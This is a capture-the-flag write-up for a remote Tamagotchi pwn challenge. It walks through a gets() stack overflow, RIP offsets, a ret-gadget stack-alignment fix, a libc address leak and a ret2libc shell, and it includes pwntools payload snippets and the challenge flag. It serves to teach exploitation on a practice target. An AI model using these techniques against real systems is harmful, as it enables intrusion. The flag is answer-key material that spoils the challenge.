# Remote tamagOtchi Pet

You might remember the Tamagotchi from the late 90's and early 2000's. Good news, we have improved the tamagotchi by putting everyone's favourite pet on the web!

The flag is located in the home directory on the server.

Connect with netcat to access your tamagotchi

$ nc motherload.td.org.uit.no 8009

# Writeup

Same as with mp3_player I started looking at this from gdb.

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
***removed unessesary functions* 
0x0000000000401236  ignore_me
0x000000000040129b  timeout
0x00000000004012c9  ignore_me_timeout
0x00000000004012ef  banner
0x0000000000401342  animal
0x000000000040137d  print_actions
0x00000000004013bd  play
0x00000000004013e0  feed
0x0000000000401441  print_care_options
0x0000000000401481  care
0x0000000000401555  main
```

This has a gets when you read a book to it. So this is where I might inject something. So sending `3\n3\n` + payload of A's ending with `\n` I can figure out how to pollute the return instruction pointer (`rip`). 

So after a lot of number adjusting I found out that 57 starts writing over it.

```
(gdb) run  < <(python -c 'print("3\n3\n" + "A"*57 + "\n")')

* Removed unessesary data * 
>> 
Which book do you want to read?
>> You read AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA for you pet

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400041 in ?? ()
```

Found out that we could use up to 62 which gave this `rip`: `0x0000414141414141`. As there is no flag in the source I guess there is a flag.txt in the home directory and they want us to create assembly code to write to stack and change the `rip` to the start of it. This is exactly what [this](https://www.youtube.com/watch?v=1S0aBV-Waeo) video talks about which I watched for the mp3_player.

I also found out that I could use `feed` with 46 characters to get the same `rip`, then I need to change `3\n3\n` to `2\n`. But the book has bigger buffer so I'll be using that.

So here I tried a bunch by injecting some shellcode and changing the `rip` to that location in memory. Prolly a few hours. Until I figured out something I did not know......

```bash
$ pwn checksec tamagotchi
[*] '/remote_tamagotchi_pet/tamagotchi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX Enabled. ChatGPT explains this better than me:

> The NX flag, also known as the "No-eXecute" flag, is a security feature that is used to prevent the execution of code from certain memory areas. When this flag is set, it indicates that the memory page is non-executable, which means that code cannot be executed from that page. This is a common technique used to prevent certain types of malicious attacks, such as buffer overflow attacks, that try to execute code from data areas. In short, the NX flag helps to make computer systems more secure by preventing the execution of code from certain memory areas.

So I need a hint.

> You will need to find the libc version used by the server

Ok, so libc, I have no idea on how to exploit this so this is gonna require some Googling/ChatGPT'ing.

> **Question:** I'm doing a hacker CTF and I got a binary which I can buffer overflow to change the RSI. But it has NX enabled so I'm not able to write code in the buffer and execute. The hint says `You will need to find the libc version used by the server`. What kind of attack do you think he means and how can I learn more about it?

> **Answer:** The hint suggests that you may be able to use a technique called Return-oriented Programming (ROP) to bypass the non-executable stack (NX) protection and execute arbitrary code. ROP is a technique that involves chaining together short snippets of code called gadgets that already exist in the program's memory, rather than injecting new code into the stack. By carefully selecting and arranging these gadgets, you can achieve almost any desired behavior. 
>
> The key to using ROP is to find the libc version used by the server, as it contains the gadgets that you will need. Libc is a library that provides standard C functions to programs, such as functions for input/output operations, memory allocation, and string manipulation. Different versions of libc may have different gadgets available, so you need to find the version that matches the server's libc.
>
> To find the libc version used by the server, you can use a technique called "libc leaking". This involves exploiting a vulnerability in the binary to leak the address of a libc function or data structure in memory, which can then be used to determine the version of libc. Once you know the libc version, you can use a tool like ROPgadget to find gadgets in that version of libc that you can use for your ROP chain.

Time to learn about ROP. Found [this](https://www.youtube.com/watch?app=desktop&v=i5-cWI_HV8o) video by John Hammond which explained a lot and helped me continue. I'll be using the `Feed` function as that has less characters (40+6 for RIP). 

I had a few problems here, I tried to send a payload with a new address for it to go to e.g. the `banner` or `feed`. But I never managed to get it. I randomly got it by using +5 on the function address as seen below:

```python
from pwn import *

elf = ELF("./tamagotchi", checksec=False)
p = elf.process()

payload  = b"A"*40 # Offset
payload += p64(elf.symbols['banner']+5) # +5 here.
    
p.recvuntil(b">>").decode()
p.sendline(b"2")
p.recvuntil(b">>").decode()
p.sendline(payload)
p.interactive()
```

After a talk with Loevland from the Discord to help me understand this. And after a while we figured out why this worked and how to properly do this. I'll try to the best of my knowlede to explain this. Firstly the +5 works most likely due to something called Stack Alignment. Not quite sure how it works but it seems like by adding +5 on the address I skip that first (and second) instruction inside the banner the `endbr64` and go Straight to the `push %rbp`. So we skip one CPU instruction and it works. One thought we have is that the endbr64 is one instruction which requires an aligned stack.

```asm
00000000004012ef <banner>:
  4012ef:    f3 0f 1e fa              endbr64 
  4012f3:    55                       push   %rbp
  4012f4:    48 89 e5                 mov    %rsp,%rbp
  4012f7:    48 8d 3d 1a 0d 00 00     lea    0xd1a(%rip),%rdi        # 402018 <_IO_stdin_used+0x18>
```

Loevland also explained to me how to do this properly so it runs all the calls. What he then did was add a `ret` function found from `ROPgadget --binary tamagotchi`. On address `0x000000000040101a` this is.

So by adding the `ret` function to the payload before our actuall function it works aswell.

```python
payload  = b"A"*40 # Offset
payload += p64(0x000000000040101a)
payload += p64(elf.symbols['banner']) 
```

Now why is this? We no longer pollute the `Return Instruction Pointer` with our expected address but the next 8 bytes. Well, `ret` if I understand correctly works by popping the address of the stack and then going to that address. So when the `feed` function finished it automatically invokes `ret` which pops the address of itself off the stack. Now the address for the banner is in `rip`. And then `ret` jumps to the popped address, which is actually a rerun of itself. But now it pops the new `rip` from the stack and jumps there.

Somehow this re-align the stack to work properly or something. But it works flaweless.

Now I can continue the video show how to build a ROP chain which is pretty simple. So quickly I created [extract_addresses.py](extract_addresses.py), ran this and got an address. 

```
$ python3 extract_addresses.py REMOTE
Using remote
puts found at 0x7fdd01a59420
gets found at 0x7fdd01a58970
printf found at 0x7fdd01a36c90
```

So next I clone the repo [libc-database](https://github.com/niklasb/libc-database) which is a program to download, search and identify different libc versions. Used `./get ubuntu` as I guess this is using a Ubuntu image. I can later get all if I need but I'll test with Ubuntu as downloading all takes a while. It downloads all the so files so you can search them.

Next I do a find which returns the libc package I need. The reason I take all 3 is because it might have by luck multiple hits on e.g. puts but on the rest it is only 1. So we match that all 3 is at these addresses and bingo.

```
$ ./find puts 0x7fdd01a59420 gets 0x7fdd01a58970 printf 0x7fdd01a36c90
ubuntu-glibc (libc6_2.31-0ubuntu9.9_amd64)

$ cp db/libc6_2.31-0ubuntu9.9_amd64.so ../
```

Now I have libc6_2.31-0ubuntu9.9_amd64.so in my folder. I can use this in the ROP command thingy. So I write a shell_code script based mostly on the youtube video from John Hammond and it becomes [get_flag.py](get_flag.py)

Running it seems to work remotely but not locally.

```bash
$ python3 shell_code.py REMOTE
Using remote
puts found at 0x7fa2140bf420
UiTHack23{t4ma_G0tcha_5h3ll}
```

So I got something working. The jist of it is that it: 

1. Connects remotely sends a payload to get the address of `puts`.
2. Loads the libc library and offsets the address on it so it matches the remote
3. injects system call which loads `/bin/sh`
4. cat's the `flag.txt` in the home folder.
  